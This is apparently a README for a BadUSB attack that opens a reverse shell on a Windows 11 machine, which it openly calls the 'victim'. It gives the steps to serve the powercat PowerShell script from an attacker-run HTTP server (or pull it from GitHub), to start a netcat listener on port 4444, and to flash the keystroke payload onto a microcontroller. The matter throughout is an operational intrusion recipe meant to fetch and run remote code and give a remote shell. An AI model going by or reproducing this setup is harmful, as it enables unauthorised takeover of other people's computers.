# Windows 11 Reverse Shell using a BadUSB
Note that this script has only been tested on Windows 11, I can't ensure this will work on previous or future versions of Windows. I won't make myself accountable for the damage this program could cause so, you're on your own. **Think twice before doing something you could regret later.**


**Modify the files so that they adjust to your needs.** You'll need to change the IP address, the port (if you'd like to change it) and I if your victim has Internet access I'd recommend you changing the URL for downloading the auxiliar script to [this](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1). That way you won't have to set up the HTTP server for the victim to download the script.

## Setting up the HTTP Server
We require **powercat** and **python3** for this step. We'll download powercat and then we will serve that folder for the Victim to download it and execute it.
Get it from this repo: ```wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1```
And then serve the folder where it's located, we can do that with ```sudo python3 -m http.server 80``` (The 80 it's because of the port and yes, we need root priviledges).

## Listening for an incoming connection
To listen for an incoming connection we are going to use netcat, just with a single command we'll be listening on port 4444:
```nc -lvp 4444```
-l means listen, -v verbose and -p port

## Executing the script
You just need to flash the script into the microcontroller using **Arduino IDE** and you're good to go.

**Remember looking at the code before flashing it, check that every parameter is OK**
